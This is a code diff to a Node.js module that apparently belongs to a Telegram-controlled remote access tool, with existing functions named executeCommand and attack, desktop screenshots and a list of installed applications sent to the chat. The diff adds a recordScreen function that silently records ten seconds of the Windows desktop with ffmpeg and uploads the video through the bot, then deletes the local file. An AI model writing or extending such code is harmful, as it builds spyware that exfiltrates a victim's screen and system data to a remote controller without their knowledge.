@@ -2,6 +2,7 @@ const exec = require("child_process").exec;
 const screenshot = require("screenshot-desktop");
 const notifier = require("node-notifier");
 const fs = require("fs");
+const os = require("os");
 const { error } = require("console");
 const { stdout, stderr } = require("process");
 const { resolve } = require("path");
@@ -116,9 +117,38 @@ const writeAndSend = async (ctx) => {
     const fileTxt = "Appslication.txt";
     fs.writeFileSync(fileTxt, parts);
     await ctx.replyWithDocument({ source: fileTxt });
+    ctx.reply("all application");
     fs.unlinkSync(fileTxt);
   } catch (error) {
     ctx.reply(error);
+  }
+};
+
+const recordScreen = async (ctx) => {
+  try {
+    const tempFileName = `temp_video_${Date.now()}.mp4`;
+    const tempFilePath = path.join(os.tmpdir(), tempFileName);
+
+    exec(
+      `ffmpeg -f gdigrab -framerate 60 -t 10 -i desktop "${tempFilePath}"`,
+      async (err) => {
+        if (err) {
+          console.error("Lỗi khi ghi video:", err);
+          return;
+        }
+
+        await ctx.replyWithVideo({ source: tempFilePath });
+        ctx.reply("gửi video thành công");
+
+        fs.unlink(tempFilePath, (unlinkErr) => {
+          if (unlinkErr) {
+            console.error("Lỗi khi xóa file :", unlinkErr);
+          }
+        });
+      }
+    );
+  } catch (err) {
+    return err;
   }
 };
 
@@ -129,5 +159,6 @@ module.exports = {
   executeCommand,
   attack,
   writeAndSend,
+  recordScreen,
   // allAp,
 };
